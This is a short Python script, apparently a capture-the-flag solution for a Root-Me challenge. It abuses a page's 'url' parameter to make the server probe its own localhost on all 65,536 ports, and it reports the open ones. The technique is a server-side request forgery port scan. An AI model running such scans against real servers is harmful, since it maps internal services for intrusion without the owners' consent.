import requests


url = "http://ctf13.root-me.org/index.php"
s = requests.Session()
param="?url=http://127.0.0.1:"
for x in range(65536):
	r = s.get(url+param+str(x))
	if r.text.find("Connection refused")==-1:
		print ("Avalible port: "+str(x))
